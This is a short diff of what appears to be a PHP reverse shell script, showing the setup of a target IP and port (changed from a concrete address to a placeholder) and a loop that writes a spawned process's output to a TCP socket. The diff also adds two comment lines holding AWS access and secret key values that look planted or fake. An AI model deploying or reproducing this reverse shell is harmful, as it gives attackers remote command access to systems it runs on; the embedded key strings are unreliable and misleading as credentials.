@@ -3,7 +3,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '15.152.50.81';  // CHANGE THIS
+$ip = 'x.x.x.x';  // CHANGE THIS
 $port = 5000;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
@@ -118,7 +118,8 @@ while (1) {
 		if ($debug) printit("STDOUT: $input");
 		fwrite($sock, $input);
 	}
-
+//AWS_ACCESS_KEY=M@sterC@rd@1234
+//AWS_SECRET_KEY=Your_@wesome	
 	// If we can read from the process's STDERR
 	// send data down tcp connection
 	if (in_array($pipes[2], $read_a)) {
